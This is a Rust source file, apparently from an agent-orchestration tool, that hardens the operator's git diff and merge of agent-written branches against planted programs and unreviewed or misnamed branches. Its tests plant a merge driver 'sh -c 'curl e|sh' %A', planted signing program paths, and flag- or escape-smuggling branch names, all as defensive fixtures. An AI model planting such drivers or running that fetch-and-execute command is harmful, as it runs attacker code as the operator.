//! **What an agent's landed branch is to the operator's checkout**: `marion diff` reads it and
//! `marion merge` merges it, each through git hardened against the programs a child could have
//! named in the repository's configuration.

use std::path::Path;

/// `git log -p` of what `commit` added over HEAD: `marion diff`'s command. Shown raw — no
/// textconv program and no external diff — because a child's branch can carry a
/// `.gitattributes` naming a diff driver. `commit` is the one [`reviewed_tip`] resolved, so what
/// is shown is the commit a later `marion merge --at` lands.
pub fn log_argv(commit: &str) -> Vec<String> {
    [
        "git",
        "log",
        "-p",
        "--stat",
        "--no-textconv",
        "--no-ext-diff",
        &format!("HEAD..{commit}"),
    ]
    .map(str::to_string)
    .to_vec()
}

/// `git merge --no-ff -- <branch>`: `marion merge`'s command, `--` so a branch name cannot be read
/// as a flag.
pub fn merge_argv(branch: &str) -> Vec<String> {
    ["git", "merge", "--no-ff", "--", branch]
        .map(str::to_string)
        .to_vec()
}

/// [`log_argv`], run in `repo` with the terminal as `git_in` runs it.
pub fn branch_log(repo: &Path, commit: &str) -> std::process::Command {
    git_in(repo, &log_argv(commit))
}

/// Why `branch` is refused as a branch marion did not make for a task (`run::task_branch_ref`),
/// or `None`. The name comes from the node's contract, and a node that named `main` or another
/// branch of the operator's would otherwise have the operator review and merge that.
fn not_marions(branch: &str) -> Option<String> {
    crate::run::task_branch_ref(branch).is_none().then(|| {
        marion_core::text::visible(&format!(
            "{branch} is not a branch marion made for a task (marion/<task>), so its name did \
             not come from marion; diff or merge it by hand if you mean to"
        ))
        .into_owned()
    })
}

/// **The commit `branch` is at, which a diff shows and a merge lands**: refused unless `branch` is
/// one marion made for a task, and, where `reviewed` names the commit the operator was shown
/// (`marion diff` prints it; the home screen passes the one its `:diff` showed), unless the branch
/// is still at exactly that commit. The node keeps writing its own branch after the operator
/// looks, so a merge of the name would land whatever it moved to; pinned, it lands what was read.
pub fn reviewed_tip(repo: &Path, branch: &str, reviewed: Option<&str>) -> Result<String, String> {
    if let Some(why) = not_marions(branch) {
        return Err(why);
    }
    if let Some(r) = reviewed
        && !(r.len() >= 40 && r.bytes().all(|b| b.is_ascii_hexdigit()))
    {
        return Err(marion_core::text::visible(&format!(
            "--at {r} is not a whole commit id; pass the one `marion diff` printed"
        ))
        .into_owned());
    }
    let out = git_in(
        repo,
        &[
            "git".into(),
            "rev-parse".into(),
            "--verify".into(),
            "--quiet".into(),
            format!("refs/heads/{branch}^{{commit}}"),
        ],
    )
    .stdin(std::process::Stdio::null())
    .stdout(std::process::Stdio::piped())
    .stderr(std::process::Stdio::null())
    .output()
    .map_err(|e| format!("could not run git to read {branch}: {e}"))?;
    let tip = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if !out.status.success() || tip.is_empty() {
        return Err(format!("{branch} is not a branch in this checkout"));
    }
    match reviewed {
        Some(r) if !r.eq_ignore_ascii_case(&tip) => Err(format!(
            "{branch} moved since it was reviewed: it was at {r} and is at {tip} now; run \
             `marion diff` again to see what it holds"
        )),
        _ => Ok(tip),
    }
}

/// [`merge_argv`] in `repo`, hardened as `git_in` runs it. Refused, with why, where `branch` is not
/// one marion made for a task, or where the repository's own config names a program a merge
/// would run (`merge_refusal`). The CLI's `marion merge` and the home screen's `:merge` both run
/// this, the screen through the CLI.
pub fn branch_merge(repo: &Path, branch: &str) -> Result<std::process::Command, String> {
    if let Some(why) = not_marions(branch) {
        return Err(format!("not merged: {why}"));
    }
    match merge_refusal(repo) {
        Some(why) => Err(why),
        None => Ok(git_in(repo, &merge_argv(branch))),
    }
}

/// The signing programs a merge commit would run: `gpg.program`, each `gpg.<format>.program`
/// and `gpg.ssh.defaultKeyCommand` (git lowercases the key names it lists).
const SIGNING_PROGRAMS: &str = r"^gpg\.(([^.]*\.)?program|ssh\.defaultkeycommand)$";

/// Why marion will not merge in `repo`, or `None`: the repository's own configuration names a
/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) or a signing program
/// ([`SIGNING_PROGRAMS`]) — a program a merge would run as the operator, set where a child could
/// have set it — or git could not say whether it does. The operator's own (global) signing stays.
fn merge_refusal(repo: &Path) -> Option<String> {
    let keys = crate::gitcmd::repo_drivers(repo).and_then(|mut keys| {
        keys.extend(crate::gitcmd::local_keys(repo, SIGNING_PROGRAMS)?);
        Ok(keys)
    });
    match keys {
        Ok(keys) if keys.is_empty() => None,
        Ok(keys) => Some(
            marion_core::text::visible(&format!(
                "not merged: this repository's own config sets {}, a program a merge would run; \
             remove it (git config --unset) or merge by hand",
                keys.join(", ")
            ))
            .into_owned(),
        ),
        Err(e) => Some(format!(
            "not merged: could not read the repository's config: {}",
            marion_core::text::visible(&e)
        )),
    }
}

/// What [`git_in`] sets over the repository's configuration, which is shared with every worktree a
/// child wrote in, so any program it names may be one a child planted, run here as the operator
/// outside any sandbox: no pager, no hooks, no editor (a merge takes git's own message), no
/// global attributes file, attributes read from `HEAD` (the operator's commit, not the branch
/// being merged, so a branch's `.gitattributes` selects no driver), and no automatic gc or
/// maintenance after it ([`crate::gitcmd::NO_MAINTENANCE`]). The operator's own hooks do
/// not run on a merge made here; their own signing does, and [`merge_refusal`] refuses a signing
/// program the repository's configuration names.
const HARDENING: &[&str] = &[
    "--no-pager",
    "--attr-source=HEAD",
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "core.editor=true",
    "-c",
    "core.attributesFile=/dev/null",
];

/// **`argv` (a `git …` line, as shown) run in `repo` with the terminal**, through
/// [`crate::gitcmd::command`] as the operator's checkout, with [`HARDENING`] on top.
fn git_in(repo: &Path, argv: &[String]) -> std::process::Command {
    let mut args = HARDENING.to_vec();
    args.extend(crate::gitcmd::NO_MAINTENANCE);
    args.extend(argv.iter().skip(1).map(String::as_str));
    let mut c = crate::gitcmd::command(&crate::gitcmd::Tree::Operator(repo), &args)
        .expect("an operator checkout is never refused");
    c.stdin(std::process::Stdio::inherit())
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit());
    c
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(c: &std::process::Command) -> Vec<String> {
        c.get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    /// The branch log handed to the operator runs no program a branch names.
    #[test]
    fn the_branch_log_runs_no_textconv_or_external_diff() {
        let args = args(&branch_log(Path::new("/r"), "0123abcd"));
        assert!(args.contains(&"--no-textconv".to_string()), "{args:?}");
        assert!(args.contains(&"--no-ext-diff".to_string()), "{args:?}");
        assert_eq!(args.last().map(String::as_str), Some("HEAD..0123abcd"));
        assert!(args.contains(&"--no-pager".to_string()), "{args:?}");
    }

    /// **The merge that runs is the line shown**, `--` before the branch included, so a branch
    /// named like a flag is merged as a branch.
    #[test]
    fn the_merge_runs_the_line_it_shows() {
        let c = git_in(Path::new("/r"), &merge_argv("-x"));
        assert_eq!(
            args(&c),
            [
                "-c",
                "core.fsmonitor=false",
                "--no-pager",
                "--attr-source=HEAD",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "core.editor=true",
                "-c",
                "core.attributesFile=/dev/null",
                "-c",
                "gc.auto=0",
                "-c",
                "maintenance.auto=false",
                "merge",
                "--no-ff",
                "--",
                "-x"
            ]
        );
        assert_eq!(c.get_current_dir(), Some(Path::new("/r")));
        for redirect in marion_harness::env_filter::GIT_REDIRECTING {
            assert!(
                c.get_envs().any(|(k, v)| k == redirect && v.is_none()),
                "{redirect} is cleared"
            );
        }
    }

    /// **marion will not merge where the repository's own config names a driver program**, and
    /// merges where it names none.
    /// **Only a branch marion made for a task is diffed or merged.** The name is read off the
    /// node's contract, so a node can name any branch; each of these is refused by both before git
    /// or the repository's config is touched (the repository here does not exist).
    #[test]
    fn a_branch_marion_did_not_make_is_refused_before_anything_runs() {
        for branch in [
            "main",
            "feature/x",
            "marion",
            "marion/",
            "marion/a/b",
            "marion/../main",
            "marion/-x",
            "marion/.hidden",
            "refs/heads/marion/t-1",
            "-x",
            "x\u{1b}[2J",
        ] {
            let repo = Path::new("/nonexistent-repo");
            for e in [
                reviewed_tip(repo, branch, None).expect_err(branch),
                branch_merge(repo, branch).expect_err(branch),
            ] {
                assert!(
                    e.contains("not a branch marion made for a task"),
                    "{branch:?}: {e}"
                );
                assert!(
                    !e.contains('\u{1b}'),
                    "{branch:?}: the refusal is printable: {e:?}"
                );
            }
        }
    }

    /// **A diff and a merge are pinned to the commit the operator reviewed.** The tip is resolved
    /// to a whole commit id; a `reviewed` id the branch has since moved off is refused naming
    /// both, and one that is not a whole id is refused as such.
    #[test]
    fn the_reviewed_commit_pins_the_tip_and_a_moved_branch_is_refused() {
        let dir = marion_testsupport::scratch("landing-reviewed-tip");
        let git = |args: &[&str]| {
            let out = marion_harness::env_filter::git_command()
                .current_dir(&dir)
                .args(["-c", "user.name=t", "-c", "user.email=t@t"])
                .args(["-c", "commit.gpgSign=false"])
                .args(args)
                .output()
                .unwrap();
            assert!(out.status.success(), "{args:?}: {out:?}");
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };
        git(&["init", "-q"]);
        git(&["commit", "-q", "--allow-empty", "-m", "one"]);
        git(&["branch", "marion/t-1"]);
        let first = git(&["rev-parse", "marion/t-1"]);
        assert_eq!(reviewed_tip(&dir, "marion/t-1", None).unwrap(), first);
        assert_eq!(
            reviewed_tip(&dir, "marion/t-1", Some(&first)).unwrap(),
            first
        );
        git(&["checkout", "-q", "marion/t-1"]);
        git(&["commit", "-q", "--allow-empty", "-m", "two"]);
        let moved = reviewed_tip(&dir, "marion/t-1", Some(&first)).unwrap_err();
        assert!(
            moved.contains("moved since it was reviewed") && moved.contains(&first),
            "{moved}"
        );
        let short = reviewed_tip(&dir, "marion/t-1", Some(&first[..12])).unwrap_err();
        assert!(short.contains("not a whole commit id"), "{short}");
        let gone = reviewed_tip(&dir, "marion/t-2", None).unwrap_err();
        assert!(gone.contains("not a branch in this checkout"), "{gone}");
    }

    #[test]
    fn a_planted_driver_in_the_repository_config_refuses_the_merge() {
        let dir = marion_testsupport::scratch("landing-merge-driver");
        let git = |args: &[&str]| {
            assert!(
                marion_harness::env_filter::git_command()
                    .current_dir(&dir)
                    .args(args)
                    .status()
                    .unwrap()
                    .success()
            )
        };
        git(&["init", "-q"]);
        assert_eq!(merge_refusal(&dir), None);
        git(&["config", "merge.evil.driver", "sh -c 'curl e|sh' %A"]);
        let why = merge_refusal(&dir).expect("refused");
        assert!(why.contains("merge.evil.driver"), "{why}");
    }

    /// **marion will not merge where the repository's own config names a signing program**, any
    /// of the three a merge commit could run, while a plain signing setting there is no program.
    #[test]
    fn a_planted_signing_program_in_the_repository_config_refuses_the_merge() {
        let dir = marion_testsupport::scratch("landing-merge-signing");
        let git = |args: &[&str]| {
            assert!(
                marion_harness::env_filter::git_command()
                    .current_dir(&dir)
                    .args(args)
                    .status()
                    .unwrap()
                    .success()
            )
        };
        git(&["init", "-q"]);
        git(&["config", "commit.gpgSign", "true"]);
        git(&["config", "gpg.format", "ssh"]);
        assert_eq!(merge_refusal(&dir), None);
        for (key, named) in [
            ("gpg.program", "gpg.program"),
            ("gpg.ssh.program", "gpg.ssh.program"),
            ("gpg.ssh.defaultKeyCommand", "gpg.ssh.defaultkeycommand"),
        ] {
            git(&["config", key, "/tmp/planted"]);
            let why = merge_refusal(&dir).expect("refused");
            assert!(why.contains(named), "{why}");
            git(&["config", "--unset", key]);
        }
    }
}
